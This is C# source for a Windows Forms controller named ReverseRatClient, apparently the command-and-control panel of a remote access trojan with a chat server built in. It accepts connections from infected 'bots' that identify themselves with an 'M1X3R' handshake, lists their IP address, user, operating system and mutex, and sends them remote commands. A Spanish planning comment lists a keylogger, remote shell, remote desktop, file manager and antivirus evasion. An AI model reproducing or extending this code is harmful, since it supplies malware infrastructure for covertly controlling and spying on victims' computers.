
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;            //for Streams
using System.Threading;     //to run commands concurrently
using System.Net;           //for IPEndPoint
using System.Security.Cryptography;
using System.Collections;
using System.IO.IsolatedStorage;

namespace ReverseRatClient
{
    /// <summary> 
    /// 
    ///   A Realizar en RAT:  
    ///  ~Conexion de cliente con columnas:  ~[Ip externa y red], ~[Nombre PC/Nombre usuario], ~[S.O.], ~[Mutex]
    ///  ~Actualizacion de items Hastable por cada conexion nueva 
    ///  ~Agregar y borrar de lista de elementos los conectados y no conectados (detectar el momento en el que se desconectan los sockets)    
    /// - Configurar ventanas independientes por conexion (control center)
    /// - Shell remoto en ventanas independientes por cada conexión (Usar Menu contextual)
    /// - Uso de recursos Capacidad de manipular un archivo Ini y agregarlo al servidor  (Configuración archivo ini)
    /// - Manejo de errores para conexiones y desconexiones (red)
    /// - GUI de Cliente   
    /// - Chequeo de indetectabilidad para antivirus
    /// - Escritorio remoto (Capturas de pantalla, control remoto)
    /// - Validación robusta de multiples escritorios, shells, comandos
    /// - File manager
    /// - Keylogger
    /// 
    ///     
    /// A realizar en Servidor: 
    ///   - Determinar información básica que ira a Archivo ini
    ///   - Cargar configuración de resource al momento de ejecutar
    ///   - Rutina robusta y validada de envio de datos (comandos)
    ///   - Prueba de fuego, que soporte transferencias y actividades paralelas
    ///   - Cifrado de datos    
    /// </summary>


    public partial class Principal : Form
    {
        TcpListener tcpListener;
        Socket socketForServer;       
        Thread th_StartListen,th_RunClient;
        Hashtable ListaBots = new Hashtable();
        List<UsuariosChat> listaUsuariosChat = new List<UsuariosChat>();
        public List<string> ListaCanales = new List<string>();
        private int contRepeticion = 0;
        private Socket SocketRepeticion;
        private const int MAX_CLIENTES_CANAL = 50;

        public Principal()
        {
            InitializeComponent();
        }
        
        
        private void Form1_Shown(object sender, EventArgs e)
        {          
            textBox2.Focus();   
                               
        }

        private void StartListen()
        {
            Socket SocketEx;
            tcpListener = new TcpListener(IPAddress.Any, 5760);
            tcpListener.Start();
            toolStripStatusLabel1.Text = @"Escuchando puerto 5760...";
            for (;;)
            {                            
                SocketEx = tcpListener.AcceptSocket();              
                IPEndPoint ipend = (IPEndPoint)SocketEx.RemoteEndPoint;
                toolStripStatusLabel1.Text = @"Conexión de " + IPAddress.Parse(ipend.Address.ToString());                
                socketForServer = SocketEx;              
                // Thread nuevo para cada cliente conectado                       
                th_RunClient = new Thread(new ThreadStart(RunClient));
                th_RunClient.Start();              
            }
            
        }

        private void RunClient()
        {
            NetworkStream networkStream;
            StreamWriter streamWriter;
            StreamReader streamReader;
            StringBuilder strInput;
            var socketNuevo = socketForServer;
            
            networkStream = new NetworkStream(socketNuevo);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);            
            strInput = new StringBuilder();

            while (true)
            {
                try
                {                   
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                }
                catch (Exception err)
                {
                    Cleanup(socketNuevo, streamReader, streamWriter, networkStream);
                    DisplayMessage("<Error en conexion:  " + err.Message + " " +  socketNuevo.GetHashCode() + ">\n");
                    break;
                }
              
                string cadenaEvaluar = EvaluaCadena(strInput, socketNuevo);

                if (cadenaEvaluar.Length == 0) // Evitar repeticion de datos
                {
                    if (strInput.ToString().Length == 2)
                    {
                        if (socketNuevo == SocketRepeticion)
                        {
                            contRepeticion++;
                        }
                        else
                        {
                            contRepeticion = 0;
                        }
                        SocketRepeticion = socketNuevo;
                        if (contRepeticion > 5)
                        {
                             contRepeticion = 0;
                             DisplayMessage("<Conexion perdida con: " + socketNuevo.GetHashCode() + ">\n");
                             string formarCadena273 = "273 " + ObtenerNickPorHash(socketNuevo.GetHashCode().ToString());
                             EnviarBroadCast(formarCadena273, socketNuevo.GetHashCode().ToString(), ObtenerCanalPorHash(socketNuevo.GetHashCode().ToString()));
                             EliminarClienteLista(socketNuevo);                             
                             Cleanup(socketNuevo, streamReader, streamWriter, networkStream);
                             break;
                        }                        
                    }                    
                    DisplayMessage(strInput.ToString());
                }
                else
                {
                    FormCollection fc = Application.OpenForms;
                    foreach (Form frm in fc)
                    {
                        if (frm.Tag.ToString() == cadenaEvaluar)
                        {
                            PanelDeControl pnlControl = (PanelDeControl) frm;
                            Application.DoEvents();
                            pnlControl.textBox1.AppendText(strInput.ToString());
                            //MessageBox.Show(@"Form Encontrada para sck");
                        }
                    }
                }
                Application.DoEvents();
                strInput.Remove(0, strInput.Length);                
            }
            //CleanupGeneral();
        }



        //Evalua cadena para devolver un Hash compatible que identifique a 
        //la ventana en caso de estar la salida redirigida a un hash en especifico
        string EvaluaCadena(StringBuilder cadena, Socket sck)
        {
            string s;
            if (ProcesarComandosRat(cadena, sck, out s)) return s;
            ProcesarComandosChat(cadena, sck);

            return "";

        }


        void ProcesarComandosChat(StringBuilder cadena, Socket sck)
        {
            var cadEv = cadena.ToString();

            if (cadEv.Length >= 3)
            {
                switch (cadEv.Substring(0, 3))
                {
                    case "100": // Cadena inicial
                        string nuevoNickName = cadEv.Split(':')[1];
                        string nuevoCanal = cadEv.Split(':')[3];
                        string nuevoCliente = cadEv.Split(':')[0].Substring(3, cadEv.Split(':')[0].Length - 3);
                     
                        if (ValidarNickNameCanal(nuevoNickName, nuevoCanal))
                        {
                           // Avisar a todos que el usuario ingresó al chat
                            string formarCadena264 = "264 " + nuevoNickName;
                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), nuevoCanal);
                            // Enviar cadena de aceptación y lista de usuarios de canal
                            string formarCadena202 = "202 " + nuevoNickName + ":" + (listaUsuariosChat.Count + 1) + ";" +
                                                     nuevoCanal + ":" + ContarUsuariosCanal(nuevoCanal) + ":" + "0";
                            listaUsuariosChat.Add(new UsuariosChat(nuevoNickName, nuevoCanal, nuevoCliente, sck));                            
                            EnviarComando(formarCadena202, sck);
                            string formarCadena222 = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
                            EnviarComando(formarCadena222, sck);
                        }                                       
                        break;
                    case "220": // Enviar listado de usuarios del canal a peticion de usuario                      
                        string formarCadena222X = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
                        EnviarComando(formarCadena222X, sck);
                        break;                        
                    case "248": //Mensaje publico
                        string mensaje = cadEv.Substring(4, cadEv.Length - 4); 
                        string formarCadena270 = "270 " + ObtenerNickPorHash(sck.GetHashCode().ToString()) +  ":" + mensaje;                      
                        EnviarBroadCast(formarCadena270, sck.GetHashCode().ToString(), ObtenerCanalPorHash(sck.GetHashCode().ToString()));
                        break;                        
                    case "255": // Mensaje Privado
                        string nickDestino = cadEv.Substring(4, cadEv.Length - 4).Split(':')[0];
                        string nickOrigen = ObtenerNickPorHash(sck.GetHashCode().ToString());
                        string mensajeprivado = cadEv.Substring(cadEv.IndexOf(":", 0, StringComparison.Ordinal) + 1);
                        EnviarMensajePrivado(nickOrigen, nickDestino, mensajeprivado);
                        break;
                    case "260": // Solicita cambio de canal
                        int numeroUsuarios = 0;
                        string canalOrigen = ObtenerCanalPorHash(sck.GetHashCode().ToString());
                        string canalDestino = cadEv.Substring(4, cadEv.Length - 4).Trim();
                        string nombreUsuarioCanal = ObtenerNickPorHash(sck.GetHashCode().ToString());
                        if (RealizarCambioCanal(canalDestino, ref numeroUsuarios, sck))
                        {
                            string formarCadenaCambioAprobadoCanal = "262 " + canalDestino + ":" + numeroUsuarios + ":" + "0";
                            EnviarComando(formarCadenaCambioAprobadoCanal, sck);
                            string formarCadena263CambiaCanal = "263 " +
                                                                nombreUsuarioCanal + ":" +
                                                                canalDestino;
                            EnviarBroadCast(formarCadena263CambiaCanal, sck.GetHashCode().ToString(), canalOrigen);
                            string formarCadena264 = "264 " + nombreUsuarioCanal;
                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), canalDestino);
                        }
                        else
                        {
                            string cadenabadRoom = "404 Bad Room Request";
                            EnviarComando(cadenabadRoom, sck);
                        }
                        break;
                    case "300": // solicita lista de canales publicos
                        foreach (var canal in ListaCanales)
                        {
                            string formarCadenaCanal = "310 " + canal + ":0:"+ DevolverNumUsuariosCanal(canal) + ":"+ MAX_CLIENTES_CANAL;                           
                            EnviarComando(formarCadenaCanal, sck);
                        }                        
                        break;
                        
                }
            }

           // MessageBox.Show(CadEv.Substring(0, 3));
        }


        //Comprobacion al pedido 260 (cambiar canal)
        bool RealizarCambioCanal(string canalDestino, ref int numUsuarios, Socket sck)
        {
            numUsuarios = DevolverNumUsuariosCanal(canalDestino);
            if (numUsuarios < MAX_CLIENTES_CANAL)
            {
                foreach (var usr in listaUsuariosChat)
                {
                    if (sck == usr.SocketUsr)
                    {
                        usr.CanalActual = canalDestino;
                    }
                }
            }
            return numUsuarios < MAX_CLIENTES_CANAL;
        }


        //Elimina un socket de la lista 
        void EliminarClienteLista(Socket sck)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.SocketUsr == sck)
                {
                    listaUsuariosChat.Remove(usr);
                    break;                    
                }
            }

        }

        
        //Envia mensaje privado a otro nick
        void EnviarMensajePrivado(string nickOrigen, string nickDestino, string mensaje)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (nickDestino == usr.NickName)
                {
                    EnviarComando("256 " + nickOrigen + ":" + mensaje, usr.SocketUsr);                    
                }
            }
        }
        

        // Validacion de nick y canal de usuarios
        bool ValidarNickNameCanal(string nickaValidar,  string canalaValidar)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (nickaValidar == usr.NickName)
                {
                    return false;
                }
            }
            int cont = 0;
            foreach (string canal in ListaCanales)
            {              
                if (canalaValidar.ToUpper() == canal.ToUpper())
                {
                    cont++;
                }
            }
            if (cont == 0)
                return false;
        
            return true;
        }


        //Contar usuarios en canal
        int ContarUsuariosCanal(string canal)
        {
            int contador = 0;
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.CanalActual == canal)
                    contador ++;
            }
            return contador;
        }
        

        //Devuelve lista de usuarios del canal donde se encuentra el hash actual
        string DevolverUsuariosCanal220(string hashSocket)
        {

            string canal = ObtenerCanalPorHash(hashSocket);
            string cadenaUsuarios = "";
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
               // MessageBox.Show(usr.NickName + " : "+ usr.CanalActual);
                if (usr.CanalActual.ToUpper() == canal.ToUpper())
                {
                    cadenaUsuarios += usr.NickName + ";";
                }
            }
            cadenaUsuarios = cadenaUsuarios.Substring(0, cadenaUsuarios.Length - 1);
            return canal + ":" + cadenaUsuarios;
        }


        // Numero de usuarios en determinado canal
        int DevolverNumUsuariosCanal(string canal)
        {
            int cont = 0;           
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.CanalActual.ToUpper() == canal.ToUpper())
                {
                    cont++;
                }
            }

            return cont;
        }


        // Canal por hash de sck
        private string ObtenerCanalPorHash(string hashActual)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {               
                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
                {
                    return usr.CanalActual;
                }
            }
            return "No Existe canal";
        }


        //Nick por hash de sck
        private string ObtenerNickPorHash(string hashActual)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
                {
                    return usr.NickName;
                }
            }
            return "Sin Nick";
        }
        
      
        //Envia mensajes publicos usando el 270, 273
        void EnviarBroadCast(string cadena, string hashActual, string canal)
        {
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                if (usr.SocketUsr.GetHashCode().ToString() != hashActual && string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
                {
                    EnviarComando(cadena, usr.SocketUsr);
                }
            }
        }


        private bool ProcesarComandosRat(StringBuilder Cadena, Socket Sck, out string s)
        {
            string[] Ini;
            // evaluar cadena iniciada
            string CadEv = "", CadRes = "";
            CadEv = Cadena.ToString();

            if (CadEv.IndexOf("|") > 0)
            {
                if (CadEv.Substring(0, CadEv.IndexOf("|")).Length > 0)
                {
                    CadRes = CadEv.Substring(0, CadEv.IndexOf("|"));
                    if (CadRes == "M1X3R")
                    {
                        //textBox3.Text = CadEv;
                        Ini = CadEv.Split('|');
                        AgregaNuevoServer(Ini[1], Ini[2], Ini[3], Ini[4], Sck.GetHashCode().ToString());
                        ListaBots[CadEv] = Sck;

                        string hashSck = Sck.GetHashCode().ToString();
                        DisplayMessage("\n<Conn:" + hashSck + ">\n");
                        EnviarComando("asignahash " + hashSck, Sck);
                        s = "";
                        return true;
                    }
                    else
                    {
                        //MessageBox.Show(CadEv.Split('|')[1]);
                        string cadenaEvaluar = CadEv.Split('|')[1];
                        FormCollection fc = Application.OpenForms;

                        foreach (Form frm in fc)
                        {
                            if (frm.Tag.ToString() == cadenaEvaluar)
                            {
                                //MessageBox.Show(@"Form Encontrada para sck");
                                {
                                    s = cadenaEvaluar;
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
            s = "";
            return false;
        }


        int EncontrarIndiceHash(DataGridView Dvg, string Hash) // Encuentra indice en base al Socket hash como parametro
        {
            for (int j = 0; j < Dvg.Rows.Count; j++)
            {
                if (Dvg[4, j].Value.ToString().Trim() == Hash)
                    return j;
            }
            return 0;
        }


        // Realiza limpieza al desconectarse un cliente
        private void Cleanup(Socket sck, StreamReader strr, StreamWriter strw, NetworkStream nts)
        {
            try
            {
                dataGridView1.Rows.RemoveAt(EncontrarIndiceHash(dataGridView1, sck.GetHashCode().ToString()));
                strr.Close();
                strw.Close();
                nts.Close();
                sck.Close();
            }
            catch (Exception err) { }           
        }



        private void CleanupGeneral()
        {
            try
            {               
                socketForServer.Close();              
            }
            catch (Exception err) { }
            toolStripStatusLabel1.Text = @"Conexion perdida";
        }


        

        private delegate void DisplayDelegate(string message);
        private void DisplayMessage(string message)
        {
            if (textBox1.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), new object[] { message });
            }
            else
            {
                Application.DoEvents();
                textBox1.AppendText(message);
            }           
        }


        private delegate void NuevoServer(string message, string PCUser, string SO, string Mutex, string SckHash);
        private void AgregaNuevoServer(string message, string PCUser, string SO, string Mutex, string SckHash)
        {
            if (dataGridView1.InvokeRequired)
            {
                Invoke(new NuevoServer(AgregaNuevoServer), new object[] {  message, PCUser, SO, Mutex, SckHash });
            }
            else
            {
                var index = dataGridView1.Rows.Add();
                dataGridView1.Rows[index].Cells["IPEquipo"].Value = message;
                dataGridView1.Rows[index].Cells["NombrePC"].Value = PCUser;
                dataGridView1.Rows[index].Cells["SistemaOperativo"].Value = SO;
                dataGridView1.Rows[index].Cells["Mutex"].Value = Mutex;
                dataGridView1.Rows[index].Cells["HashSocket"].Value = SckHash;                
            }
        }

        
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {                
                    EnviaComandoTexto();
                }
            }
            catch (Exception err) { }
            
        }

        private void EnviaComandoTexto()
        {
            EnviarComando(textBox2.Text);
            // if (textBox2.Text == "exit") Cleanup();
            //  if (textBox2.Text == "terminate") Cleanup();
            if (textBox2.Text == @"cls") textBox1.Text = "";
            textBox2.Text = "";
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            CleanupGeneral();

            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void Form1_Load(object sender, EventArgs e) // Basado en hilos
        {
            ListaCanales.Add("Manga-Anime");
            ListaCanales.Add("Hackers");

            th_StartListen = new Thread(new ThreadStart(StartListen));
            th_StartListen.Start();   
        }

        private void button1_Click(object sender, EventArgs e) // Boton de ejemplo para enviar un comando
        {
            EnviarComando("hola");            
        }

        private void EnviarComando(string Comando)
        {
            string Mensaje = Comando;
            string CadenaForm = "";
            Funciones x = new Funciones();
            Socket SckEnviar;
            byte[] SendCbytes;

            CadenaForm = x.FormarCadena(dataGridView1); //Enviar al elemento seleccionado del DataGridView            
            SckEnviar = (Socket)ListaBots[CadenaForm]; // Poner en la lista de Bots elemento cadena obtenida del datagridview
            DisplayMessage("<" + SckEnviar.GetHashCode()  + ">");
            NetworkStream nStr = new NetworkStream(SckEnviar);
            SendCbytes = Encoding.ASCII.GetBytes(Mensaje);

            StreamWriter strw = new StreamWriter(nStr);
            StringBuilder strib = new StringBuilder();
            strib.Append(Mensaje);
            strw.WriteLine(strib);
            strw.Flush();
            strw.Close();
            nStr.Close();
        }


        private void EnviarComando(string Comando, Socket sck)
        {
            string Mensaje = Comando;
            string CadenaForm = "";

            try
            {
                DisplayMessage("<" + sck.GetHashCode() + ">");
                NetworkStream nStr = new NetworkStream(sck);
                if (nStr == Stream.Null)
                {
                    MessageBox.Show("holaa");
                }
                StreamWriter strw = new StreamWriter(nStr);
                StringBuilder strib = new StringBuilder();
                strib.Append(Mensaje);
                strw.WriteLine(strib);
                strw.Flush();
                strw.Close();
                nStr.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            
        }


        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            EnviarComando("hola");
        }

        private void dataGridView1_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            
         
        }

        private void dataGridView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show();
            }
        }

        private void cerrarServidorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            EnviarComando("terminate");
        }

        private void button3_Click(object sender, EventArgs e)
        {
           EnviaComandoTexto();

           
        }

        private void abrirVentanaToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (dataGridView1.Rows.Count > 0)
            {
                PanelDeControl ventana = new PanelDeControl();
                ventana.Show();
                ventana.Text = dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString();
                ventana.Tag = dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString();
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            // Mensaje Admin
            foreach (UsuariosChat usr in listaUsuariosChat)
            {
                EnviarComando("700 "+ textBox4.Text, usr.SocketUsr);                
            }
            textBox4.Text = "";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Funciones x = new Funciones();
            Socket SckEnviar;            
            var cadenaForm = x.FormarCadena(dataGridView1);
            SckEnviar = (Socket)ListaBots[cadenaForm]; // Poner en la lista de Bots elemento cadena obtenida del datagridview
            textBox3.Text = SckEnviar.Connected.ToString();
        }

       
      
      
    }
}